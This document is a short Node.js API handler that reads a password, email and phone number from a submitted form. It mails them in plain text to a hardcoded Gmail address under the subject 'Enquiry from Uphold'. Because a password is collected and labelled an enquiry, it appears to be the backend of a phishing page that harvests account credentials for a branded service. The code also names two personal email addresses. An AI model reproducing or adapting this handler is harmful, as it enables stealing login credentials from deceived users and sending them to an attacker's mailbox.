import nodemailer from 'nodemailer'

export default async function handler(req, res) {

    const tranporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: process.env.SMTP_USERNAME,
            pass: process.env.SMTP_PASSWORD
        }
    })

    try {
        if (req.method === 'POST') {
            const { password, email, phoneNumber } = req.body;

            const info = await tranporter.sendMail({
                from: 'gargchitvan378@gmail.com',
                to: 'Karan9000189@gmail.com',
                subject: 'Enquiry from Uphold',
                text: `Password: ${password} \n Email: ${email} \n Phone: ${phoneNumber}`
            })

            if (info?.messageId) {
                res.status(200).json({
                    message: 'Successfully sent',
                    data: info?.messageId
                })
            }
        }
    }catch(err){
        console.log(err);
        res.status(500).json({
            message: 'Something went wrong',
            data: err
        })
    }
    
}